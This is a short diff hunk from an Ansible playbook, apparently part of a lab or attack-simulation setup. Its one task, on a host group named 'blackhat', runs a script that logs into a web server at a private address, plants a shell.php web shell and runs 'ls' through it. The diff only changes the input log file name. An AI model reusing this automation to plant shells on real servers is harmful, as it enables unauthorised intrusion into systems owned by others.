@@ -38,6 +38,6 @@
   hosts: blackhat
   tasks:
     - name: log in web server and inject it with shell file
-      raw: php shellinject.php logs.txt 10.0.0.16/ shell.php ls
+      raw: php shellinject.php logs_decoded.txt 10.0.0.16/ shell.php ls
       register: out
     - debug: var=out.stdout_lines
